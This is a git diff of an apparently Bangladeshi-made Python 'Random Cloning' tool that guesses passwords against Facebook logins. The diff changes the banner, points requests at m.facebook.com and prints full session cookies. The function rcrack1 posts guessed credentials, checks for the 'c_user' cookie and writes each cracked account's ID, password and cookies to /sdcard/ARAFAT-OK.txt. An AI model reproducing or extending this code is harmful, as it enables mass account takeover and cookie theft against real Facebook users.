@@ -122,15 +122,18 @@ for txxxtt in range (1000):
 	ugen.append(ffg)
 #--------------------------(LOGO BOX)--------------------------#
 logo =("""
-\x1b[38;5;46m █████  ██████   █████  ███████  █████  ████████ 
-\x1b[38;5;47m██   ██ ██   ██ ██   ██ ██      ██   ██    ██    
-\x1b[38;5;48m███████ ██████  ███████ █████   ███████    ██    
-\x1b[38;5;49m██   ██ ██   ██ ██   ██ ██      ██   ██    ██    
-\x1b[38;5;50m██   ██ ██   ██ ██   ██ ██      ██   ██    ██                                                  
+\x1b[38;5;46m                                   ,...             
+\x1b[38;5;46m      db                         .d' ""       mm    
+     ;MM:                        dM`          MM    
+    ,V^MM.    `7Mb,od8 ,6"Yb.   mMMmm ,6"Yb.mmMMmm  
+   ,M  `MM      MM' "'8)   MM    MM  8)   MM  MM    
+   AbmmmqMA     MM     ,pm9MM    MM   ,pm9MM  MM    
+  A'     VML    MM    8M   MM    MM  8M   MM  MM    
+.AMA.   .AMMA..JMML.  `Moo9^Yo..JMML.`Moo9^Yo.`Mbmo                                                   
 \x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mArafat Hosan
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mArafat Hosan
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ● \x1b[38;5;46m1.4
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mVersion  \033[1;31m ● \x1b[38;5;46m1.5
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mTools  \033[1;31m   ● \x1b[38;5;46mRandom Cloning
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mType  \033[1;31m    ● \x1b[38;5;46mfree
 \x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆""")
@@ -219,7 +222,7 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'free.facebook.com',
+            header_freefb = {'authority': 'm.facebook.com',
             'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
@@ -239,7 +242,7 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f"\033[38;5;46m[ARAFAT-OK] {uid}|{ps}")
+                print('\r\r\033[1;32m[ARAFAT-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
                 open('/sdcard/ARAFAT-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                 oks.append(uid)
                 break
